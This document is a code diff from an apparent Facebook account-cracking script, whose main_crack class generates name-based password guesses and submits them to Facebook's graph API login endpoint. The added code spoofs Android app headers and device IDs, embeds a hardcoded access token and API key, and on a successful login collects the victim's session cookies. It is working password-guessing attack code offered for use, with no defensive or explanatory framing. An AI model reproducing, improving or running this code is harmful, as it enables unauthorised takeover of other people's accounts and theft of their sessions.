@@ -408,15 +408,42 @@ class main_crack():
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 with requests.Session() as session:
-                    data = {
-'lsd', 'AVoA4gnqPqo',
-'jazoest', '21009',
-'uid', '61551104974202',
-'next', 'https://mbasic.facebook.com/login/save-device/',
-'flow', 'login_no_pin',
-'pass', 'md',
-}
-                headers = {'Host', 'p.facebook.com', 'viewport-width', '980', 'sec-ch-ua', '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile', '?0', 'sec-ch-ua-platform', '"Android"', 'sec-ch-prefers-color-scheme', 'light', 'dnt', '1', 'upgrade-insecure-requests', '1', 'user-agent', 'Mozilla/5.0 (Linux; U; Android 7;  TL-tl; GT-S758X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4690.149 Mobile Safari/537.36', 'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site', 'same-origin', 'sec-fetch-mode', 'navigate', 'sec-fetch-user', '?1', 'sec-fetch-dest', 'document', 'accept-encoding', 'gzip, deflate, br', 'accept-language', 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6',}
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": "100049974613980",
+"password": "md123",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent':('Davik/2.1.0 (Linux; U; Android 12.0.1; Infinix X676C Build/SP1A.210812.016) [FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'EXCELLENT',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
